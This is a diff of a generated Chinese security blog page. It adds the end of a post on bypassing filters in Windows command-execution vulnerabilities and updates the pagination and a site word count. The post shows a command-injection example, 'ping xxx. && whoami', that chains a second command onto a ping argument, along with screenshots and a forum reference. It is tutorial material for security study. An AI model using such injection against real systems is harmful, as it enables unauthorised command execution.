+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-18-1024x488.png"></p>
+<p>使用<code>ping xxx. &amp;&amp; whoami</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-19-1024x60.png"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/4557.html">https://bbs.zkaq.cn/t/4557.html</a></p>
 
       
     </div>
@@ -589,7 +356,7 @@ dumpTable()
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/41/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/41/">41</a><span class="page-number current">42</span>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/41/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/41/">41</a><span class="page-number current">42</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/43/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -613,7 +380,7 @@ dumpTable()
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
